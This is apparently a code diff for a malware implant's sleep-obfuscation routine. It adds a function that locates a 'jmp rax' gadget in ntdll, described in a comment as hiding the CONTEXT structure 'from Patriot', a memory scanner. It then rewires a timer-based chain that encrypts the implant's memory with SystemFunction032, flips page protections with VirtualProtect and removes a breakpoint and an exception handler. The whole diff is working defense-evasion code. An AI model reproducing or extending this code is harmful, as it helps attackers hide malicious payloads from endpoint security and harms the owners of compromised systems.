@@ -98,6 +98,85 @@ typedef struct
 
 /* STR Hashes */
 #define H_STR_TPALLOCTIMER			0x383d6995 /* TpAllocTimer */
+#define H_STR_TEXT				0x0b6ea858 /* .text */
+
+/*!
+ *
+ * Purpose:
+ *
+ * Locates a jmp rax 0xFF, 0xE0 gadget in memory.
+ * Used as a means of hiding the CONTEXT structure
+ * from Patriot.
+ *
+!*/
+D_SEC( D ) PVOID GetJmpRaxTarget( VOID )
+{
+	HDE			Hde;
+
+	ULONG			Ofs = 0;
+
+	PBYTE			Ptr = NULL;
+	PBYTE			Pos = NULL;
+	PIMAGE_DOS_HEADER	Dos = NULL;
+	PIMAGE_NT_HEADERS	Nth = NULL;
+	PIMAGE_SECTION_HEADER	Sec = NULL;
+
+	/* Zero out stack structures */
+	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
+
+	Dos = C_PTR( PebGetModule( H_LIB_NTDLL ) );
+	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
+	Sec = IMAGE_FIRST_SECTION( Nth );
+
+	/* Enumerate each individual section in memory */
+	for ( INT Idx = 0; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
+		/* Locate the .text section in memory */
+		if ( HashString( & Sec[ Idx ].Name, 0 ) == H_STR_TEXT ) {
+
+			Ofs = 0;
+			Pos = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress );
+
+			do 
+			{
+				/* Attempt to disassemble */
+				HDE_DISASM( C_PTR( U_PTR( Pos ) + Ofs ), &Hde );
+
+				/* Did this fail to disassemble? */
+				if ( Hde.flags & F_ERROR ) {
+					/* Couldnt decode? Odd: Move up one byte! */
+					Ofs = Ofs + 1; 
+
+					/* Restart the loop */
+					continue;
+				};
+
+				/* Is the instruction the right size? */
+				if ( Hde.len == 2 ) {
+					/* Does the instruction match the correct operand etc? */
+					if ( ( ( PBYTE ) ( C_PTR( U_PTR( Pos ) + Ofs ) ) ) [ 0 ] == 0xFF && ( ( PBYTE )( C_PTR( U_PTR( Pos ) + Ofs ) ) ) [ 1 ] == 0xE0 ) {
+						/* Set the address of the instruction */
+						Ptr = C_PTR( U_PTR( Pos ) + Ofs );
+
+						/* Abort! */
+						break;
+					};
+				};
+
+				/* Increment to next instruction */
+				Ofs = Ofs + Hde.len;
+			} while ( Ofs < Sec[ Idx ].SizeOfRawData );
+
+			/* Abort! */
+			break;
+		};
+	};
+
+	/* Zero out stack structures */
+	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
+
+	/* Return Address */
+	return C_PTR( Ptr );
+};
 
 /*!
  *
@@ -337,6 +416,8 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 
 	PVOID			Cln = NULL;
 	PVOID			Pol = NULL;
+
+	PVOID			Gdg = NULL;
 	
 	PTABLE			Tbl = NULL;
 	PCONTEXT		Beg = NULL;
@@ -452,19 +533,26 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 				/* Initialize the thread pool environment */
 				InitializeThreadpoolEnvironment( &Tbl->Table->Debugger.PoolEnv );
 
+				/* Create the thread pool the timer will use */
 				if ( !( Pol = Api.CreateThreadpool( NULL ) ) ) {
 					/* Abort! */
 					break;
 				};
 
+				/* Create the cleanup group to free memory */
 				if ( !( Cln = Api.CreateThreadpoolCleanupGroup() ) ) {
 					/* Abort! */
 					break;
 				};
 
-				/* Initialize the 'pool' that the timer will use */
+				/* Set the minimum and maximum the thread pool uses */
 				Api.SetThreadpoolThreadMaximum( Pol, 1 );
-				Api.SetThreadpoolThreadMinimum( Pol, 1 );
+				if ( ! Api.SetThreadpoolThreadMinimum( Pol, 1 ) ) {
+					/* Abort! */
+					break;
+				};
+
+				/* Initialize the pool environment information */
 				SetThreadpoolCallbackPool( & Tbl->Table->Debugger.PoolEnv, Pol );
 				SetThreadpoolCallbackCleanupGroup( & Tbl->Table->Debugger.PoolEnv, Cln, NULL );
 
@@ -507,77 +595,89 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 									break;
 								};
 
-								CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );
+								/* Get the address of the jmp rax gadget */
+								if ( ( Gdg = GetJmpRaxTarget( ) ) != NULL ) { 
 
-								__builtin_memcpy( Beg, &Ctx, sizeof( CONTEXT ) );
-								Beg->ContextFlags = CONTEXT_FULL;
-								Beg->Rip  = U_PTR( Api.WaitForSingleObjectEx );
-								Beg->Rsp -= sizeof( PVOID );
-								Beg->Rcx  = U_PTR( Ev2 );
-								Beg->Rdx  = U_PTR( INFINITE );
-								Beg->R8   = U_PTR( FALSE );
+									/* Enable CFG on the target function in case its blacklisted */
+									CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );
 
-								__builtin_memcpy( Set, &Ctx, sizeof( CONTEXT ) );
-								Set->ContextFlags = CONTEXT_FULL;
-								Set->Rip  = U_PTR( Api.VirtualProtect );
-								Set->Rsp -= sizeof( PVOID );
-								Set->Rcx  = U_PTR( Img );
-								Set->Rdx  = U_PTR( XLn );
-								Set->R8   = U_PTR( PAGE_READWRITE );
-								Set->R9   = U_PTR( &Prt );
+									__builtin_memcpy( Beg, &Ctx, sizeof( CONTEXT ) );
+									Beg->ContextFlags = CONTEXT_FULL;
+									Beg->Rip  = U_PTR( Gdg );
+									Beg->Rsp -= sizeof( PVOID );
+									Beg->Rax  = U_PTR( Api.WaitForSingleObjectEx );
+									Beg->Rcx  = U_PTR( Ev2 );
+									Beg->Rdx  = U_PTR( INFINITE );
+									Beg->R8   = U_PTR( FALSE );
 
-								__builtin_memcpy( Enc, &Ctx, sizeof( CONTEXT ) );
-								Enc->ContextFlags = CONTEXT_FULL;
-								Enc->Rip  = U_PTR( Api.SystemFunction032 );
-								Enc->Rsp -= sizeof( PVOID );
-								Enc->Rcx  = U_PTR( &Buf );
-								Enc->Rdx  = U_PTR( &Key );
+									__builtin_memcpy( Set, &Ctx, sizeof( CONTEXT ) );
+									Set->ContextFlags = CONTEXT_FULL;
+									Set->Rip  = U_PTR( Gdg );
+									Set->Rsp -= sizeof( PVOID );
+									Set->Rax  = U_PTR( Api.VirtualProtect );
+									Set->Rcx  = U_PTR( Img );
+									Set->Rdx  = U_PTR( XLn );
+									Set->R8   = U_PTR( PAGE_READWRITE );
+									Set->R9   = U_PTR( &Prt );
 
-								__builtin_memcpy( Blk, &Ctx, sizeof( CONTEXT ) );
-								Blk->ContextFlags = CONTEXT_FULL;
-								Blk->Rip  = U_PTR( Api.WaitForSingleObjectEx );
-								Blk->Rsp -= sizeof( PVOID );
-								Blk->Rcx  = U_PTR( Ev3 );
-								Blk->Rdx  = U_PTR( DelayTime );
-								Blk->R8   = U_PTR( FALSE );
+									__builtin_memcpy( Enc, &Ctx, sizeof( CONTEXT ) );
+									Enc->ContextFlags = CONTEXT_FULL;
+									Enc->Rip  = U_PTR( Gdg );
+									Enc->Rsp -= sizeof( PVOID );
+									Enc->Rax  = U_PTR( Api.SystemFunction032 );
+									Enc->Rcx  = U_PTR( &Buf );
+									Enc->Rdx  = U_PTR( &Key );
 
-								__builtin_memcpy( Dec, &Ctx, sizeof( CONTEXT ) );
-								Dec->ContextFlags = CONTEXT_FULL;
-								Dec->Rip  = U_PTR( Api.SystemFunction032 );
-								Dec->Rsp -= sizeof( PVOID );
-								Dec->Rcx  = U_PTR( &Buf );
-								Dec->Rdx  = U_PTR( &Key );
+									__builtin_memcpy( Blk, &Ctx, sizeof( CONTEXT ) );
+									Blk->ContextFlags = CONTEXT_FULL;
+									Blk->Rip  = U_PTR( Gdg );
+									Blk->Rsp -= sizeof( PVOID );
+									Blk->Rax  = U_PTR( Api.WaitForSingleObjectEx );
+									Blk->Rcx  = U_PTR( Ev3 );
+									Blk->Rdx  = U_PTR( DelayTime );
+									Blk->R8   = U_PTR( FALSE );
 
-								__builtin_memcpy( Res, &Ctx, sizeof( CONTEXT ) );
-								Res->ContextFlags = CONTEXT_FULL;
-								Res->Rip  = U_PTR( Api.VirtualProtect );
-								Res->Rsp -= sizeof( PVOID );
-								Res->Rcx  = U_PTR( Img );
-								Res->Rdx  = U_PTR( XLn );
-								Res->R8   = U_PTR( PAGE_EXECUTE_READ );
-								Res->R9   = U_PTR( &Prt );
+									__builtin_memcpy( Dec, &Ctx, sizeof( CONTEXT ) );
+									Dec->ContextFlags = CONTEXT_FULL;
+									Dec->Rip  = U_PTR( Gdg );
+									Dec->Rsp -= sizeof( PVOID );
+									Dec->Rax  = U_PTR( Api.SystemFunction032 );
+									Dec->Rcx  = U_PTR( &Buf );
+									Dec->Rdx  = U_PTR( &Key );
 
-								__builtin_memcpy( End, &Ctx, sizeof( CONTEXT ) );
-								End->ContextFlags = CONTEXT_FULL;
-								End->Rip  = U_PTR( Api.SetEvent );
-								End->Rsp -= sizeof( PVOID );
-								End->Rcx  = U_PTR( Ev3 );
+									__builtin_memcpy( Res, &Ctx, sizeof( CONTEXT ) );
+									Res->ContextFlags = CONTEXT_FULL;
+									Res->Rip  = U_PTR( Gdg );
+									Res->Rsp -= sizeof( PVOID );
+									Res->Rax  = U_PTR( Api.VirtualProtect );
+									Res->Rcx  = U_PTR( Img );
+									Res->Rdx  = U_PTR( XLn );
+									Res->R8   = U_PTR( PAGE_EXECUTE_READ );
+									Res->R9   = U_PTR( &Prt );
 
-								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Beg, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Set, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Enc, Api.NtContinue, Enc, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Blk, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Dec, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Res, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
-								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, End, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
+									__builtin_memcpy( End, &Ctx, sizeof( CONTEXT ) );
+									End->ContextFlags = CONTEXT_FULL;
+									End->Rip  = U_PTR( Gdg );
+									End->Rsp -= sizeof( PVOID );
+									End->Rax  = U_PTR( Api.SetEvent );
+									End->Rcx  = U_PTR( Ev3 );
 
-								/* Remove the breakpoint on ntdll!TpAllocTimer */
-								RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+									if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Beg, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
+									if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Set, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
+									if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Enc, Api.NtContinue, Enc, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
+									if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Blk, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
+									if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Dec, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
+									if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Res, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
+									if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, End, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
 
-								/* Remove the Vectored Exception Handler! */
-								if ( Api.RtlRemoveVectoredExceptionHandler( Veh ) ) {
-									/* Execute and await the frame results! */
-									Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
+									/* Remove the breakpoint on ntdll!TpAllocTimer */
+									RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
+
+									/* Remove the Vectored Exception Handler! */
+									if ( Api.RtlRemoveVectoredExceptionHandler( Veh ) ) {
+										/* Execute and await the frame results! */
+										Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
+									};
 								};
 							};
 						};
